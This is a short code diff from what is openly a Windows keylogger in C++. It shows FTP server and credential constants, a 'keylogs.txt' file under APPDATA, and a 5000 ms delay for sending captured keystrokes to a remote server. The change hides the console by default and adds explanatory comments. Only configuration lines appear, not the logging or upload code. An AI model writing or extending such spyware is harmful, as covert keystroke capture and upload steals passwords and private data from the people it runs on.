@@ -8,6 +8,7 @@
 #pragma comment(lib, "Wininet")
 using namespace std;
 
+// FTP Server Credentials
 const string FTP_SERVER = "";
 const string FTP_USERNAME = "";
 const string FTP_PASSWORD = "";
@@ -15,7 +16,10 @@ const string FTP_PASSWORD = "";
 const string FILE_NAME = "keylogs.txt";
 const string LOGS_FILE_PATH = string(getenv("APPDATA")) + "\\" + FILE_NAME;
 
-bool noConsole = false;
+// determines if the console is displayed or not (off=default)
+bool noConsole = true;
+
+// send delay of which when the key logs file is sent to the server (measured: milliseconds)
 const int DELAY = 5000;
 
 void LogKey(char* key)
